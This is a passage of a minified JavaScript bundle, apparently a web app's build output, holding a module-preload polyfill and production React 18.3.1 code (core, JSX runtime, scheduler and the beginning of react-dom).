var Gp=Object.defineProperty;var Yp=(a,o,l)=>o in a?Gp(a,o,{enumerable:!0,configurable:!0,writable:!0,value:l}):a[o]=l;var ie=(a,o,l)=>Yp(a,typeof o!="symbol"?o+"":o,l);(function(){const o=document.createElement("link").relList;if(o&&o.supports&&o.supports("modulepreload"))return;for(const c of document.querySelectorAll('link[rel="modulepreload"]'))d(c);new MutationObserver(c=>{for(const h of c)if(h.type==="childList")for(const w of h.addedNodes)w.tagName==="LINK"&&w.rel==="modulepreload"&&d(w)}).observe(document,{childList:!0,subtree:!0});function l(c){const h={};return c.integrity&&(h.integrity=c.integrity),c.referrerPolicy&&(h.referrerPolicy=c.referrerPolicy),c.crossOrigin==="use-credentials"?h.credentials="include":c.crossOrigin==="anonymous"?h.credentials="omit":h.credentials="same-origin",h}function d(c){if(c.ep)return;c.ep=!0;const h=l(c);fetch(c.href,h)}})();var Jo={exports:{}},Dr={},el={exports:{}},G={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var hc;function Xp(){if(hc)return G;hc=1;var a=Symbol.for("react.element"),o=Symbol.for("react.portal"),l=Symbol.for("react.fragment"),d=Symbol.for("react.strict_mode"),c=Symbol.for("react.profiler"),h=Symbol.for("react.provider"),w=Symbol.for("react.context"),S=Symbol.for("react.forward_ref"),m=Symbol.for("react.suspense"),P=Symbol.for("react.memo"),T=Symbol.for("react.lazy"),j=Symbol.iterator;function E(v){return v===null||typeof v!="object"?null:(v=j&&v[j]||v["@@iterator"],typeof v=="function"?v:null)}var Q={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},L=Object.assign,q={};function V(v,b,K){this.props=v,this.context=b,this.refs=q,this.updater=K||Q}V.prototype.isReactComponent={},V.prototype.setState=function(v,b){if(typeof v!="object"&&typeof v!="function"&&v!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,v,b,"setState")},V.prototype.forceUpdate=function(v){this.updater.enqueueForceUpdate(this,v,"forceUpdate")};function Oe(){}Oe.prototype=V.prototype;function Qe(v,b,K){this.props=v,this.context=b,this.refs=q,this.updater=K||Q}var Ke=Qe.prototype=new Oe;Ke.constructor=Qe,L(Ke,V.prototype),Ke.isPureReactComponent=!0;var Ee=Array.isArray,ze=Object.prototype.hasOwnProperty,ve={current:null},$e={key:!0,ref:!0,__self:!0,__source:!0};function tt(v,b,K){var Y,J={},ee=null,le=null;if(b!=null)for(Y in b.ref!==void 0&&(le=b.ref),b.key!==void 0&&(ee=""+b.key),b)ze.call(b,Y)&&!$e.hasOwnProperty(Y)&&(J[Y]=b[Y]);var ne=arguments.length-2;if(ne===1)J.children=K;else if(1<ne){for(var de=Array(ne),Ye=0;Ye<ne;Ye++)de[Ye]=arguments[Ye+2];J.children=de}if(v&&v.defaultProps)for(Y in ne=v.defaultProps,ne)J[Y]===void 0&&(J[Y]=ne[Y]);return{$$typeof:a,type:v,key:ee,ref:le,props:J,_owner:ve.current}}function Ot(v,b){return{$$typeof:a,type:v.type,key:b,ref:v.ref,props:v.props,_owner:v._owner}}function bt(v){return typeof v=="object"&&v!==null&&v.$$typeof===a}function on(v){var b={"=":"=0",":":"=2"};return"$"+v.replace(/[=:]/g,function(K){return b[K]})}var kt=/\/+/g;function Ge(v,b){return typeof v=="object"&&v!==null&&v.key!=null?on(""+v.key):b.toString(36)}function ut(v,b,K,Y,J){var ee=typeof v;(ee==="undefined"||ee==="boolean")&&(v=null);var le=!1;if(v===null)le=!0;else switch(ee){case"string":case"number":le=!0;break;case"object":switch(v.$$typeof){case a:case o:le=!0}}if(le)return le=v,J=J(le),v=Y===""?"."+Ge(le,0):Y,Ee(J)?(K="",v!=null&&(K=v.replace(kt,"$&/")+"/"),ut(J,b,K,"",function(Ye){return Ye})):J!=null&&(bt(J)&&(J=Ot(J,K+(!J.key||le&&le.key===J.key?"":(""+J.key).replace(kt,"$&/")+"/")+v)),b.push(J)),1;if(le=0,Y=Y===""?".":Y+":",Ee(v))for(var ne=0;ne<v.length;ne++){ee=v[ne];var de=Y+Ge(ee,ne);le+=ut(ee,b,K,de,J)}else if(de=E(v),typeof de=="function")for(v=de.call(v),ne=0;!(ee=v.next()).done;)ee=ee.value,de=Y+Ge(ee,ne++),le+=ut(ee,b,K,de,J);else if(ee==="object")throw b=String(v),Error("Objects are not valid as a React child (found: "+(b==="[object Object]"?"object with keys {"+Object.keys(v).join(", ")+"}":b)+"). If you meant to render a collection of children, use an array instead.");return le}function wt(v,b,K){if(v==null)return v;var Y=[],J=0;return ut(v,Y,"","",function(ee){return b.call(K,ee,J++)}),Y}function Fe(v){if(v._status===-1){var b=v._result;b=b(),b.then(function(K){(v._status===0||v._status===-1)&&(v._status=1,v._result=K)},function(K){(v._status===0||v._status===-1)&&(v._status=2,v._result=K)}),v._status===-1&&(v._status=0,v._result=b)}if(v._status===1)return v._result.default;throw v._result}var ge={current:null},N={transition:null},W={ReactCurrentDispatcher:ge,ReactCurrentBatchConfig:N,ReactCurrentOwner:ve};function M(){throw Error("act(...) is not supported in production builds of React.")}return G.Children={map:wt,forEach:function(v,b,K){wt(v,function(){b.apply(this,arguments)},K)},count:function(v){var b=0;return wt(v,function(){b++}),b},toArray:function(v){return wt(v,function(b){return b})||[]},only:function(v){if(!bt(v))throw Error("React.Children.only expected to receive a single React element child.");return v}},G.Component=V,G.Fragment=l,G.Profiler=c,G.PureComponent=Qe,G.StrictMode=d,G.Suspense=m,G.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=W,G.act=M,G.cloneElement=function(v,b,K){if(v==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+v+".");var Y=L({},v.props),J=v.key,ee=v.ref,le=v._owner;if(b!=null){if(b.ref!==void 0&&(ee=b.ref,le=ve.current),b.key!==void 0&&(J=""+b.key),v.type&&v.type.defaultProps)var ne=v.type.defaultProps;for(de in b)ze.call(b,de)&&!$e.hasOwnProperty(de)&&(Y[de]=b[de]===void 0&&ne!==void 0?ne[de]:b[de])}var de=arguments.length-2;if(de===1)Y.children=K;else if(1<de){ne=Array(de);for(var Ye=0;Ye<de;Ye++)ne[Ye]=arguments[Ye+2];Y.children=ne}return{$$typeof:a,type:v.type,key:J,ref:ee,props:Y,_owner:le}},G.createContext=function(v){return v={$$typeof:w,_currentValue:v,_currentValue2:v,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},v.Provider={$$typeof:h,_context:v},v.Consumer=v},G.createElement=tt,G.createFactory=function(v){var b=tt.bind(null,v);return b.type=v,b},G.createRef=function(){return{current:null}},G.forwardRef=function(v){return{$$typeof:S,render:v}},G.isValidElement=bt,G.lazy=function(v){return{$$typeof:T,_payload:{_status:-1,_result:v},_init:Fe}},G.memo=function(v,b){return{$$typeof:P,type:v,compare:b===void 0?null:b}},G.startTransition=function(v){var b=N.transition;N.transition={};try{v()}finally{N.transition=b}},G.unstable_act=M,G.useCallback=function(v,b){return ge.current.useCallback(v,b)},G.useContext=function(v){return ge.current.useContext(v)},G.useDebugValue=function(){},G.useDeferredValue=function(v){return ge.current.useDeferredValue(v)},G.useEffect=function(v,b){return ge.current.useEffect(v,b)},G.useId=function(){return ge.current.useId()},G.useImperativeHandle=function(v,b,K){return ge.current.useImperativeHandle(v,b,K)},G.useInsertionEffect=function(v,b){return ge.current.useInsertionEffect(v,b)},G.useLayoutEffect=function(v,b){return ge.current.useLayoutEffect(v,b)},G.useMemo=function(v,b){return ge.current.useMemo(v,b)},G.useReducer=function(v,b,K){return ge.current.useReducer(v,b,K)},G.useRef=function(v){return ge.current.useRef(v)},G.useState=function(v){return ge.current.useState(v)},G.useSyncExternalStore=function(v,b,K){return ge.current.useSyncExternalStore(v,b,K)},G.useTransition=function(){return ge.current.useTransition()},G.version="18.3.1",G}var mc;function ul(){return mc||(mc=1,el.exports=Xp()),el.exports}/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var gc;function Zp(){if(gc)return Dr;gc=1;var a=ul(),o=Symbol.for("react.element"),l=Symbol.for("react.fragment"),d=Object.prototype.hasOwnProperty,c=a.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,h={key:!0,ref:!0,__self:!0,__source:!0};function w(S,m,P){var T,j={},E=null,Q=null;P!==void 0&&(E=""+P),m.key!==void 0&&(E=""+m.key),m.ref!==void 0&&(Q=m.ref);for(T in m)d.call(m,T)&&!h.hasOwnProperty(T)&&(j[T]=m[T]);if(S&&S.defaultProps)for(T in m=S.defaultProps,m)j[T]===void 0&&(j[T]=m[T]);return{$$typeof:o,type:S,key:E,ref:Q,props:j,_owner:c.current}}return Dr.Fragment=l,Dr.jsx=w,Dr.jsxs=w,Dr}var yc;function Jp(){return yc||(yc=1,Jo.exports=Zp()),Jo.exports}var y=Jp(),me=ul(),Zi={},tl={exports:{}},Ve={},nl={exports:{}},rl={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var vc;function ef(){return vc||(vc=1,(function(a){function o(N,W){var M=N.length;N.push(W);e:for(;0<M;){var v=M-1>>>1,b=N[v];if(0<c(b,W))N[v]=W,N[M]=b,M=v;else break e}}function l(N){return N.length===0?null:N[0]}function d(N){if(N.length===0)return null;var W=N[0],M=N.pop();if(M!==W){N[0]=M;e:for(var v=0,b=N.length,K=b>>>1;v<K;){var Y=2*(v+1)-1,J=N[Y],ee=Y+1,le=N[ee];if(0>c(J,M))ee<b&&0>c(le,J)?(N[v]=le,N[ee]=M,v=ee):(N[v]=J,N[Y]=M,v=Y);else if(ee<b&&0>c(le,M))N[v]=le,N[ee]=M,v=ee;else break e}}return W}function c(N,W){var M=N.sortIndex-W.sortIndex;return M!==0?M:N.id-W.id}if(typeof performance=="object"&&typeof performance.now=="function"){var h=performance;a.unstable_now=function(){return h.now()}}else{var w=Date,S=w.now();a.unstable_now=function(){return w.now()-S}}var m=[],P=[],T=1,j=null,E=3,Q=!1,L=!1,q=!1,V=typeof setTimeout=="function"?setTimeout:null,Oe=typeof clearTimeout=="function"?clearTimeout:null,Qe=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function Ke(N){for(var W=l(P);W!==null;){if(W.callback===null)d(P);else if(W.startTime<=N)d(P),W.sortIndex=W.expirationTime,o(m,W);else break;W=l(P)}}function Ee(N){if(q=!1,Ke(N),!L)if(l(m)!==null)L=!0,Fe(ze);else{var W=l(P);W!==null&&ge(Ee,W.startTime-N)}}function ze(N,W){L=!1,q&&(q=!1,Oe(tt),tt=-1),Q=!0;var M=E;try{for(Ke(W),j=l(m);j!==null&&(!(j.expirationTime>W)||N&&!on());){var v=j.callback;if(typeof v=="function"){j.callback=null,E=j.priorityLevel;var b=v(j.expirationTime<=W);W=a.unstable_now(),typeof b=="function"?j.callback=b:j===l(m)&&d(m),Ke(W)}else d(m);j=l(m)}if(j!==null)var K=!0;else{var Y=l(P);Y!==null&&ge(Ee,Y.startTime-W),K=!1}return K}finally{j=null,E=M,Q=!1}}var ve=!1,$e=null,tt=-1,Ot=5,bt=-1;function on(){return!(a.unstable_now()-bt<Ot)}function kt(){if($e!==null){var N=a.unstable_now();bt=N;var W=!0;try{W=$e(!0,N)}finally{W?Ge():(ve=!1,$e=null)}}else ve=!1}var Ge;if(typeof Qe=="function")Ge=function(){Qe(kt)};else if(typeof MessageChannel<"u"){var ut=new MessageChannel,wt=ut.port2;ut.port1.onmessage=kt,Ge=function(){wt.postMessage(null)}}else Ge=function(){V(kt,0)};function Fe(N){$e=N,ve||(ve=!0,Ge())}function ge(N,W){tt=V(function(){N(a.unstable_now())},W)}a.unstable_IdlePriority=5,a.unstable_ImmediatePriority=1,a.unstable_LowPriority=4,a.unstable_NormalPriority=3,a.unstable_Profiling=null,a.unstable_UserBlockingPriority=2,a.unstable_cancelCallback=function(N){N.callback=null},a.unstable_continueExecution=function(){L||Q||(L=!0,Fe(ze))},a.unstable_forceFrameRate=function(N){0>N||125<N?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):Ot=0<N?Math.floor(1e3/N):5},a.unstable_getCurrentPriorityLevel=function(){return E},a.unstable_getFirstCallbackNode=function(){return l(m)},a.unstable_next=function(N){switch(E){case 1:case 2:case 3:var W=3;break;default:W=E}var M=E;E=W;try{return N()}finally{E=M}},a.unstable_pauseExecution=function(){},a.unstable_requestPaint=function(){},a.unstable_runWithPriority=function(N,W){switch(N){case 1:case 2:case 3:case 4:case 5:break;default:N=3}var M=E;E=N;try{return W()}finally{E=M}},a.unstable_scheduleCallback=function(N,W,M){var v=a.unstable_now();switch(typeof M=="object"&&M!==null?(M=M.delay,M=typeof M=="number"&&0<M?v+M:v):M=v,N){case 1:var b=-1;break;case 2:b=250;break;case 5:b=1073741823;break;case 4:b=1e4;break;default:b=5e3}return b=M+b,N={id:T++,callback:W,priorityLevel:N,startTime:M,expirationTime:b,sortIndex:-1},M>v?(N.sortIndex=M,o(P,N),l(m)===null&&N===l(P)&&(q?(Oe(tt),tt=-1):q=!0,ge(Ee,M-v))):(N.sortIndex=b,o(m,N),L||Q||(L=!0,Fe(ze))),N},a.unstable_shouldYield=on,a.unstable_wrapCallback=function(N){var W=E;return function(){var M=E;E=W;try{return N.apply(this,arguments)}finally{E=M}}}})(rl)),rl}var kc;function tf(){return kc||(kc=1,nl.exports=ef()),nl.exports}/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var wc;function nf(){if(wc)return Ve;wc=1;var a=ul(),o=tf();function l(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,n=1;n<arguments.length;n++)t+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var d=new Set,c={};function h(e,t){w(e,t),w(e+"Capture",t)}function w(e,t){for(c[e]=t,e=0;e<t.length;e++)d.add(t[e])}var S=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),m=Object.prototype.hasOwnProperty,P=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,T={},j={};function E(e){return m.call(j,e)?!0:m.call(T,e)?!1:P.test(e)?j[e]=!0:(T[e]=!0,!1)}function Q(e,t,n,r){if(n!==null&&n.type===0)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return r?!1:n!==null?!n.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function L(e,t,n,r){if(t===null||typeof t>"u"||Q(e,t,n,r))return!0;if(r)return!1;if(n!==null)switch(n.type){case 3:return!t;case 4:return t===!1;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}function q(e,t,n,r,i,s,u){this.acceptsBooleans=t===2||t===3||t===4,this.attributeName=r,this.attributeNamespace=i,this.mustUseProperty=n,this.propertyName=e,this.type=t,this.sanitizeURL=s,this.removeEmptyString=u}var V={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){V[e]=new q(e,0,!1,e,null,!1,!1)}),[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var t=e[0];V[t]=new q(t,1,!1,e[1],null,!1,!1)}),["contentEditable","draggable","spellCheck","value"].forEach(function(e){V[e]=new q(e,2,!1,e.toLowerCase(),null,!1,!1)}),["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){V[e]=new q(e,2,!1,e,null,!1,!1)}),"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){V[e]=new q(e,3,!1,e.toLowerCase(),null,!1,!1)}),["checked","multiple","muted","selected"].forEach(function(e){V[e]=new q(e,3,!0,e,null,!1,!1)}),["capture","download"].forEach(function(e){V[e]=new q(e,4,!1,e,null,!1,!1)}),["cols","rows","size","span"].forEach(function(e){V[e]=new q(e,6,!1,e,null,!1,!1)}),["rowSpan","start"].forEach(function(e){V[e]=new q(e,5,!1,e.toLowerCase(),null,!1,!1)});var Oe=/[\-:]([a-z])/g;function Qe(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var t=e.replace(Oe,Qe);V[t]=new q(t,1,!1,e,null,!1,!1)}),"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var t=e.replace(Oe,Qe);V[t]=new q(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)}),["xml:base","xml:lang","xml:space"].forEach(function(e){var t=e.replace(Oe,Qe);V[t]=new q(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)}),["tabIndex","crossOrigin"].forEach(function(e){V[e]=new q(e,1,!1,e.toLowerCase(),null,!1,!1)}),V.xlinkHref=new q("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1),["src","href","action","formAction"].forEach(function(e){V[e]=new q(e,1,!1,e.toLowerCase(),null,!0,!0)});function Ke(e,t,n,r){var i=V.hasOwnProperty(t)?V[t]:null;(i!==null?i.type!==0:r||!(2<t.length)||t[0]!=="o"&&t[0]!=="O"||t[1]!=="n"&&t[1]!=="N")&&(L(t,n,i,r)&&(n=null),r||i===null?E(t)&&(n===null?e.removeAttribute(t):e.setAttribute(t,""+n)):i.mustUseProperty?e[i.propertyName]=n===null?i.type===3?!1:"":n:(t=i.attributeName,r=i.attributeNamespace,n===null?e.removeAttribute(t):(i=i.type,n=i===3||i===4&&n===!0?"":""+n,r?e.setAttributeNS(r,t,n):e.setAttribute(t,n))))}var Ee=a.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,ze=Symbol.for("react.element"),ve=Symbol.for("react.portal"),$e=Symbol.for("react.fragment"),tt=Symbol.for("react.strict_mode"),Ot=Symbol.for("react.profiler"),bt=Symbol.for("react.provider"),on=Symbol.for("react.context"),kt=Symbol.for("react.forward_ref"),Ge=Symbol.for("react.suspense"),ut=Symbol.for("react.suspense_list"),wt=Symbol.for("react.memo"),Fe=Symbol.for("react.lazy"),ge=Symbol.for("react.offscreen"),N=Symbol.iterator;function W(e){return e===null||typeof e!="object"?null:(e=N&&e[N]||e["@@iterator"],typeof e=="function"?e:null)}var M=Object.assign,v;function b(e){if(v===void 0)try{throw Error()}catch(n){var t=n.stack.trim().match(/\n( *(at )?)/);v=t&&t[1]||""}return`
`+v+e}var K=!1;function Y(e,t){if(!e||K)return"";K=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(t)if(t=function(){throw Error()},Object.defineProperty(t.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(t,[])}catch(_){var r=_}Reflect.construct(e,[],t)}else{try{t.call()}catch(_){r=_}e.call(t.prototype)}else{try{throw Error()}catch(_){r=_}e()}}catch(_){if(_&&r&&typeof _.stack=="string"){for(var i=_.stack.split(`
`),s=r.stack.split(`
`),u=i.length-1,p=s.length-1;1<=u&&0<=p&&i[u]!==s[p];)p--;for(;1<=u&&0<=p;u--,p--)if(i[u]!==s[p]){if(u!==1||p!==1)do if(u--,p--,0>p||i[u]!==s[p]){var f=`
`+i[u].replace(" at new "," at ");return e.displayName&&f.includes("<anonymous>")&&(f=f.replace("<anonymous>",e.displayName)),f}while(1<=u&&0<=p);break}}}finally{K=!1,Error.prepareStackTrace=n}return(e=e?e.displayName||e.name:"")?b(e):""}function J(e){switch(e.tag){case 5:return b(e.type);case 16:return b("Lazy");case 13:return b("Suspense");case 19:return b("SuspenseList");case 0:case 2:case 15:return e=Y(e.type,!1),e;case 11:return e=Y(e.type.render,!1),e;case 1:return e=Y(e.type,!0),e;default:return""}}function ee(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case $e:return"Fragment";case ve:return"Portal";case Ot:return"Profiler";case tt:return"StrictMode";case Ge:return"Suspense";case ut:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case on:return(e.displayName||"Context")+".Consumer";case bt:return(e._context.displayName||"Context")+".Provider";case kt:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case wt:return t=e.displayName||null,t!==null?t:ee(e.type)||"Memo";case Fe:t=e._payload,e=e._init;try{return ee(e(t))}catch{}}return null}function le(e){var t=e.type;switch(e.tag){case 24:return"Cache";case 9:return(t.displayName||"Context")+".Consumer";case 10:return(t._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=t.render,e=e.displayName||e.name||"",t.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return t;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return ee(t);case 8:return t===tt?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t}return null}function ne(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function de(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function Ye(e){var t=de(e)?"checked":"value",n=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),r=""+e[t];if(!e.hasOwnProperty(t)&&typeof n<"u"&&typeof n.get=="function"&&typeof n.set=="function"){var i=n.get,s=n.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return i.call(this)},set:function(u){r=""+u,s.call(this,u)}}),Object.defineProperty(e,t,{enumerable:n.enumerable}),{getValue:function(){return r},setValue:function(u){r=""+u},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function Ur(e){e._valueTracker||(e._valueTracker=Ye(e))}function wl(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),r="";return e&&(r=de(e)?e.checked?"true":"false":e.value),e=r,e!==n?(t.setValue(e),!0):!1}function Wr(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function ss(e,t){var n=t.checked;return M({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:n??e._wrapperState.initialChecked})}function xl(e,t){var n=t.defaultValue==null?"":t.defaultValue,r=t.checked!=null?t.checked:t.defaultChecked;n=ne(t.value!=null?t.value:n),e._wrapperState={initialChecked:r,initialValue:n,controlled:t.type==="checkbox"||t.type==="radio"?t.checked!=null:t.value!=null}}function Sl(e,t){t=t.checked,t!=null&&Ke(e,"checked",t,!1)}function os(e,t){Sl(e,t);var n=ne(t.value),r=t.type;if(n!=null)r==="number"?(n===0&&e.value===""||e.value!=n)&&(e.value=""+n):e.value!==""+n&&(e.value=""+n);else if(r==="submit"||r==="reset"){e.removeAttribute("value");return}t.hasOwnProperty("value")?ls(e,t.type,n):t.hasOwnProperty("defaultValue")&&ls(e,t.type,ne(t.defaultValue)),t.checked==null&&t.defaultChecked!=null&&(e.defaultChecked=!!t.defaultChecked)}function _l(e,t,n){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var r=t.type;if(!(r!=="submit"&&r!=="reset"||t.value!==void 0&&t.value!==null))return;t=""+e._wrapperState.initialValue,n||t===e.value||(e.value=t),e.defaultValue=t}n=e.name,n!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,n!==""&&(e.name=n)}function ls(e,t,n){(t!=="number"||Wr(e.ownerDocument)!==e)&&(n==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+n&&(e.defaultValue=""+n))}var Xn=Array.isArray;function En(e,t,n,r){if(e=e.options,t){t={};for(var i=0;i<n.length;i++)t["$"+n[i]]=!0;for(n=0;n<e.length;n++)i=t.hasOwnProperty("$"+e[n].value),e[n].selected!==i&&(e[n].selected=i),i&&r&&(e[n].defaultSelected=!0)}else{for(n=""+ne(n),t=null,i=0;i<e.length;i++){if(e[i].value===n){e[i].selected=!0,r&&(e[i].defaultSelected=!0);return}t!==null||e[i].disabled||(t=e[i])}t!==null&&(t.selected=!0)}}function as(e,t){if(t.dangerouslySetInnerHTML!=null)throw Error(l(91));return M({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function El(e,t){var n=t.value;if(n==null){if(n=t.children,t=t.defaultValue,n!=null){if(t!=null)throw Error(l(92));if(Xn(n)){if(1<n.length)throw Error(l(93));n=n[0]}t=n}t==null&&(t=""),n=t}e._wrapperState={initialValue:ne(n)}}function Tl(e,t){var n=ne(t.value),r=ne(t.defaultValue);n!=null&&(n=""+n,n!==e.value&&(e.value=n),t.defaultValue==null&&e.defaultValue!==n&&(e.defaultValue=n)),r!=null&&(e.defaultValue=""+r)}function Pl(e){var t=e.textContent;t===e._wrapperState.initialValue&&t!==""&&t!==null&&(e.value=t)}function Cl(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function us(e,t){return e==null||e==="http://www.w3.org/1999/xhtml"?Cl(t):e==="http://www.w3.org/2000/svg"&&t==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var Hr,bl=(function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(t,n,r,i){MSApp.execUnsafeLocalFunction(function(){return e(t,n,r,i)})}:e})(function(e,t){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=t;else{for(Hr=Hr||document.createElement("div"),Hr.innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=Hr.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}});function Zn(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&n.nodeType===3){n.nodeValue=t;return}}e.textContent=t}var Jn={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Jc=["Webkit","ms","Moz","O"];Object.keys(Jn).forEach(function(e){Jc.forEach(function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),Jn[t]=Jn[e]})});function Al(e,t,n){return t==null||typeof t=="boolean"||t===""?"":n||typeof t!="number"||t===0||Jn.hasOwnProperty(e)&&Jn[e]?(""+t).trim():t+"px"}function Rl(e,t){e=e.style;for(var n in t)if(t.hasOwnProperty(n)){var r=n.indexOf("--")===0,i=Al(n,t[n],r);n==="float"&&(n="cssFloat"),r?e.setProperty(n,i):e[n]=i}}var ed=M({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function 